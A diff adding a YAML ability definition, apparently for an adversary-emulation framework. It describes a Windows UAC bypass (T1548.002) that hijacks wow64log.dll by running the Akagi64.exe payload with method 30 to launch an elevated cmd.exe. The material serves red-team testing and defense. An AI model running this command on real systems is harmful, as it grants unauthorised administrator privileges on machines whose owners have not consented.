@@ -1,0 +1,45 @@
+- technique_name: 'Abuse Elevation Control Mechanism: Bypass User Access Control'
+  tactic: privilege-escalation
+  repeatable: false
+  plugin: stockpile
+  privilege: ''
+  requirements: []
+  singleton: false
+  additional_info: {}
+  delete_payload: true
+  access: {}
+  name: wow64log DLL Hijack
+  technique_id: T1548.002
+  description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
+  buckets:
+  - privilege-escalation
+  executors:
+  - timeout: 60
+    cleanup: []
+    payloads:
+    - Akagi64.exe
+    uploads: []
+    platform: windows
+    parsers: []
+    code: null
+    language: null
+    variations: []
+    command: .\Akagi64.exe 30 C:\Windows\System32\cmd.exe
+    name: cmd
+    build_target: null
+    additional_info: {}
+  - timeout: 60
+    cleanup: []
+    payloads:
+    - Akagi64.exe
+    uploads: []
+    platform: windows
+    parsers: []
+    code: null
+    language: null
+    variations: []
+    command: .\Akagi64.exe 30 C:\Windows\System32\cmd.exe
+    name: psh
+    build_target: null
+    additional_info: {}
+  id: 95ad5d69-563e-477b-802b-4855bfb3be09
